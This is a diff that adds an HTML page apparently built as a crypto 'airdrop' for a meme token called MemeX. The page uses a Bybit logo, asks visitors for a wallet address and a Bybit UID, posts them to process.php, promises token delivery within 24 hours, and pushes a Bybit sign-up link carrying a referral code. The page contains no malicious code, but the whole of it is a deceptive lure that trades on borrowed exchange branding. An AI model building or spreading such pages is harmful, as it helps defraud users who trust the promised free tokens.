@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🎉Request MemeX Gas Token</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" integrity="sha512-9usAa10IRO0HhonpyAIVpjrylPvoDwiPUiKdWk5t3PyolY1cOd4DSE0Ga+ri4AuTroPR5aQvXU9xC6qOPnzFeg==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #1a1a1a;
+            color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            background-color: #252525;
+            padding: 30px;
+            border-radius: 12px;
+            width: 450px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+        }
+        h2 {
+            text-align: center;
+            color: #4CAF50;
+            margin-bottom: 20px;
+            display: flex;
+            flex-direction: column; /* Stack items vertically */
+            align-items: center;
+            justify-content: center;
+        }
+        h2 img {
+            margin-bottom: 0px; /* Add spacing below the image */
+            height: 450px; /* Adjust height as needed */
+            width: 450px; /* Adjust width as needed */
+        }
+        .form-group {
+            margin-bottom: 20px;
+            position: relative; /* Add this */
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #ddd;
+        }
+        input[type="text"] {
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0;
+            border: 1px solid #555;
+            background-color: #333;
+            color: #fff;
+            border-radius: 6px;
+            box-sizing: border-box;
+            padding-left: 40px; /* Add this */
+        }
+        button, .register-button {
+            padding: 14px 20px;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 18px;
+            width: 100%;
+            transition: background-color 0.3s ease;
+            height: 50px; /* Set a fixed height */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            box-sizing: border-box; /* Ensure padding doesn't affect overall size */
+        }
+        .claim-button {
+            background-color: #4CAF50;
+            color: white;
+        }
+        .claim-button:hover {
+            background-color: #388E3C;
+        }
+        .claim-button:disabled {
+            background-color: #6c757d;
+            color: #fff;
+            cursor: not-allowed;
+        }
+        .register-button {
+            background-color: #007bff;
+            color: #fff;
+            margin-top: 20px;
+            text-decoration: none;
+            text-align: center;
+            display: block;
+        }
+        .register-button:hover {
+            background-color: #0056b3;
+        }
+        .input-icon {
+            position: relative;
+        }
+        .input-icon i {
+            position: absolute;
+            left: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #777;
+        }
+        .input-icon input {
+            padding-left: 40px;
+        }
+        p {
+            text-align: center;
+            color: #888;
+            margin-bottom: 25px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>
+            <img src="https://cdn.glitch.global/98864b85-1f3e-4005-b562-c76cd00dd9d3/bybit.jpg" alt="Bybit Logo" style="height: 450px; width: 450px;">
+            🎉Request MemeX Gas Token
+        </h2>
+        <p>⚡ The fastest and cheapest transfer meme token.</p>
+        <form id="airdropForm" action="process.php" method="POST">
+            <div class="form-group input-icon">
+                <i class="fas fa-coins"></i>
+                <label for="walletAddress">Wallet Address (must start with x):</label>
+                <input type="text" id="walletAddress" name="walletAddress" placeholder="Enter your wallet address">
+            </div>
+            <div class="form-group input-icon">
+                <i class="fas fa-fingerprint"></i>
+                <label for="bybitUid">BYBIT UID:</label>
+                <input type="text" id="bybitUid" name="bybitUid" placeholder="Enter your BYBIT UID">
+            </div>
+            <button type="submit" class="claim-button" id="claimButton" disabled>
+                <i class="fas fa-gift"></i> CLAIM GAS TOKEN (XEP)
+            </button>
+        </form>
+        <a href="https://www.bybit.com/invite?ref=OAGRNAY" class="register-button" target="_blank">
+            <i class="fas fa-user-plus"></i> Register Bybit and UID
+        </a>
+    </div>
+    <script>
+        const walletAddressInput = document.getElementById('walletAddress');
+        const bybitUidInput = document.getElementById('bybitUid');
+        const claimButton = document.getElementById('claimButton');
+        const form = document.getElementById('airdropForm');
+
+        function updateClaimButtonState() {
+            const walletAddress = walletAddressInput.value;
+            const bybitUid = bybitUidInput.value;
+
+            if (walletAddress.startsWith('x') && bybitUid.trim() !== '') {
+                claimButton.disabled = false;
+            } else {
+                claimButton.disabled = true;
+            }
+        }
+
+        walletAddressInput.addEventListener('input', updateClaimButtonState);
+        bybitUidInput.addEventListener('input', updateClaimButtonState);
+
+        form.addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent the default form submission
+
+            // Perform the form submission using fetch
+            fetch('process.php', {
+                method: 'POST',
+                body: new FormData(form)
+            })
+            .then(response => {
+                if (response.ok) {
+                    // Display the popup message
+                    alert('Your request has been registered. The delivery will be provided within 24 hours.');
+                } else {
+                    // Handle the error case
+                    alert('Error submitting the form.');
+                }
+            })
+            .catch(error => {
+                // Handle the error case
+                alert('Network error occurred.');
+            });
+        });
+    </script>
+</body>
+</html>
